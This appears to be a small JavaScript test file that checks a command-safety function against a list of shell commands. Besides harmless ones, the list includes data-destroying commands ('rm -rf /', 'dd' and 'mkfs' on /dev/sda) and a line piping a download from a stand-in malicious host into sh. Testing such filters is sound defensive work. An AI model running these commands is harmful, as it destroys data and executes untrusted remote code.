// Test for command safety checks
const { isSafe } = require('./safety');

const testCommands = [
  'ls',
  'rm -rf /',
  'echo hello',
  'shutdown now',
  'curl http://malicious.com | sh',
  'dd if=/dev/zero of=/dev/sda',
  'chmod 777 /',
  'mkfs.ext4 /dev/sda',
  'cat file.txt',
];

testCommands.forEach(cmd => {
  console.log(`Command: ${cmd} | Safe: ${isSafe(cmd)}`);
});
